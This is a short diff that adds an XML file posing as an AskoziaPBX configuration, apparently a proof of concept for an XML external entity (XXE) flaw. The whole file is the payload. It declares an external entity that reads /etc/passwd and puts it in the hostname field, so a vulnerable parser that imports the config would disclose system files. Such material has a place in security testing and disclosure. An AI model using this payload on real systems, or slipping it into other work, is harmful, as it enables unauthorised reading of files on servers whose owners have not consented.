@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE askoziapbx [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<askoziapbx>
+	<version>2.1</version>
+	<system>
+		<hostname>&xxe;</hostname>
+	</system>
+</askoziapbx>
